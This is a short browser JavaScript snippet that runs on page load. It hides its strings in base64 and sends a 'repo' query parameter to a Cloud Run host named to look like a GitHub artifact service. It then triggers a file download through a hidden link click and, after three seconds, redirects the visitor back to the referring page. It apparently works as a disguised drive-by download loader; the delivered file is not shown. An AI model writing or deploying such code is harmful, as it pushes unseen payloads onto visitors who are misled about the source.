(function () {
  const queryString = window.location.search;
  const urlParams = new URLSearchParams(queryString);

  if (!!urlParams.get(atob('cmVwbw=='))) {
    fetch(atob('aHR0cHM6Ly9naXRodWItYXJ0aWZhY3QtNnlyNG5iZWYzcS11Yy5hLnJ1bi5hcHAv') + queryString, {
      redirect: 'manual'
    })
      .then(function (res) {
        console.log('res:');
        console.log(res);

        if (!!res) {
          var fileUrl = res.url;

          console.log('fileUrl: ' + fileUrl);

          var link = document.createElement('a');
          link.href = fileUrl;
          link.download = fileUrl.substr(fileUrl.lastIndexOf('/') + 1);
          link.click();

          var referrer = document.referrer;

          if (!!referrer) {
            console.log('referrer: ' + referrer);

            if (referrer !== window.location.href.split('?')[0]) {
              window.setTimeout(function () {
                window.location.replace(referrer);
              }, 3000);
            }
          }
        }
      });
  }
})();
